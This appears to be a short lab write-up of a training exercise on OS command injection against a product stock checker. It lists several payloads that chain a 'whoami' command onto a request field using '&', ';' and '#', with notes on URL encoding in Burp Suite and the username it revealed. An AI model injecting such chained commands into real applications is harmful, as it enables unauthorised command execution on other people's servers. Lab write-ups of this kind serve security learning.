# OS command injection, simple case

1. Command injection: product stock checker.
2. Goal: execute the `whoami` command to determine the name of the current user.

### Analysis
- Use Burp suite.
- `ctrl + u`: URL encode.

```bash
# (&, ;): it causes three separate commands to execute, one after another.
# (#): comment.

& whoami &
# or
; whoami ;
# or
; whoami #
# I found current username: peter-LS6mge.
```